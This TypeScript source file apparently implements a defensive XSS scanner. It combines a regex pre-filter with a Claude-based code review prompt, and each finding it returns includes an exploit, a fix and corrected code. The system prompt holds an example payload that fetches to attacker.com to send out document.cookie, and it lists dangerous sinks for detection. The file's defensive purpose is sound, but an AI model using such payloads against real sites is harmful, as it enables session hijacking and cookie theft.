import { getClaudeClient, extractJson, type ClaudeClient } from "../engines/claude-client.js";
import { findXssSuspects, type XssSuspect } from "../engines/xss-prefilter.js";

export interface ScanXssInput {
  code: string;
  language?: string;
  path?: string;
  model?: string;
}

export type XssSeverity = "critical" | "high" | "medium" | "low";

export interface XssFinding {
  name: string;
  kind: "reflected" | "stored" | "dom" | "template" | "other";
  severity: XssSeverity;
  line: number | null;
  description: string;
  exploit: string;
  fix: string;
  fixedCode?: string;
}

export interface ScanXssOutput {
  analyzed: boolean;
  reason?: string;
  model?: string;
  suspects: XssSuspect[];
  findings: XssFinding[];
  summary: string;
}

export const DEFAULT_XSS_MODEL = process.env.IRONWARD_XSS_MODEL ?? "claude-sonnet-4-5";

const SYSTEM_PROMPT = `You are a senior application-security engineer performing a focused code review for cross-site scripting (XSS) defects.

Scope:
- Reflected XSS: request input flows directly into the HTTP response body without encoding.
- Stored XSS: request input persisted to a store and later rendered without encoding.
- DOM XSS: user-controlled data reaches dangerous sinks (innerHTML, outerHTML, document.write, insertAdjacentHTML, eval, new Function, location, setTimeout("...")).
- Framework-specific: React dangerouslySetInnerHTML, Vue v-html, Angular [innerHTML] / bypassSecurityTrust*, Svelte {@html}, SolidJS innerHTML={}.
- Template injection: EJS <%- %>, Handlebars {{{ }}}, Jinja |safe, Jinja autoescape=False, Flask Markup(), Django |safe.
- Unsafe PHP echo / print of $_GET / $_POST / $_REQUEST.

Out of scope here (other tools own these):
- SQL injection, auth bypass, secrets, vulnerable dependencies.

A regex pre-filter has flagged dangerous sinks under "Suspects". Use them to focus, but you MAY flag additional issues or dismiss false positives with clear justification (e.g. "innerHTML value is a safe literal string").

Rules for findings:
- Only flag if the data flow is user-controlled AND unsanitized.
- Known-safe: DOMPurify.sanitize, sanitize-html, textContent, innerText, escapeHtml, React {variable} text rendering, Vue {{ }}, Angular {{ }}, Svelte { }.
- Prefer fixes that use the framework's native escaping (textContent, React children, v-text) or DOMPurify for HTML-needing cases.

Output format — return ONLY a single JSON object, no prose, no markdown fences:
{
  "findings": [
    {
      "name": "Short name (e.g. 'Reflected XSS in /search via innerHTML')",
      "kind": "reflected" | "stored" | "dom" | "template" | "other",
      "severity": "critical" | "high" | "medium" | "low",
      "line": <integer line or null>,
      "description": "Two or three sentences explaining the defect and data flow.",
      "exploit": "Concrete attacker payload — e.g. '?q=<script>fetch(\\"attacker.com/?c=\\"+document.cookie)</script>'.",
      "fix": "Two or three sentences describing the correct remediation.",
      "fixedCode": "Minimal corrected snippet, <= 8 lines, same language."
    }
  ],
  "summary": "One sentence overall assessment."
}`;

interface ClaudeXssResponse {
  findings?: Array<Partial<XssFinding>>;
  summary?: string;
}

export async function runScanXss(
  input: ScanXssInput,
  client?: ClaudeClient,
): Promise<ScanXssOutput> {
  const code = input.code ?? "";
  if (!code.trim()) {
    return { analyzed: false, reason: "empty input", suspects: [], findings: [], summary: "No code provided." };
  }

  const suspects = findXssSuspects(code);
  if (suspects.length === 0) {
    return {
      analyzed: false,
      reason: "no XSS sink patterns detected",
      suspects: [],
      findings: [],
      summary: "Pre-filter found no dangerous sinks; skipped deep analysis.",
    };
  }

  const language = input.language ?? "code";
  const model = input.model ?? DEFAULT_XSS_MODEL;
  const suspectBlock = suspects
    .map((s, i) => `  ${i + 1}. L${s.line} — ${s.reason}\n     ${s.snippet}`)
    .join("\n");

  const user = `Language: ${language}${input.path ? `\nFile: ${input.path}` : ""}

Suspects (from pre-filter):
${suspectBlock}

Full source:
\`\`\`${language}
${code}
\`\`\``;

  const api = client ?? getClaudeClient();
  const raw = await api.analyze({
    model,
    system: SYSTEM_PROMPT,
    user,
    maxTokens: 2048,
    temperature: 0,
  });

  const parsed = extractJson<ClaudeXssResponse>(raw);
  const findings: XssFinding[] = (parsed.findings ?? []).map((f) => ({
    name: String(f.name ?? "Unnamed XSS finding"),
    kind: (f.kind as XssFinding["kind"]) ?? "other",
    severity: (f.severity as XssSeverity) ?? "medium",
    line: typeof f.line === "number" ? f.line : null,
    description: String(f.description ?? ""),
    exploit: String(f.exploit ?? ""),
    fix: String(f.fix ?? ""),
    fixedCode: f.fixedCode ? String(f.fixedCode) : undefined,
  }));

  return {
    analyzed: true,
    model,
    suspects,
    findings,
    summary: String(parsed.summary ?? (findings.length === 0 ? "No XSS defects detected." : "")),
  };
}

export function formatXssReport(out: ScanXssOutput): string {
  if (!out.analyzed) return out.summary;
  const lines: string[] = [];
  lines.push(`XSS review via ${out.model} — ${out.suspects.length} suspect${out.suspects.length === 1 ? "" : "s"}, ${out.findings.length} confirmed.`);
  lines.push("");
  if (out.findings.length === 0) {
    lines.push("No confirmed XSS defects. Pre-filter suspects reviewed:");
    for (const s of out.suspects) lines.push(`  L${s.line}: ${s.reason}`);
    if (out.summary) lines.push(`\nSummary: ${out.summary}`);
    return lines.join("\n");
  }
  for (const f of out.findings) {
    lines.push(`[${f.severity.toUpperCase()}] [${f.kind}]${f.line !== null ? ` L${f.line}` : ""}  ${f.name}`);
    lines.push(`  What: ${f.description}`);
    lines.push(`  Exploit: ${f.exploit}`);
    lines.push(`  Fix: ${f.fix}`);
    if (f.fixedCode) {
      lines.push("  Fixed code:");
      for (const fl of f.fixedCode.split("\n")) lines.push(`    ${fl}`);
    }
    lines.push("");
  }
  if (out.summary) lines.push(`Summary: ${out.summary}`);
  return lines.join("\n").trimEnd();
}
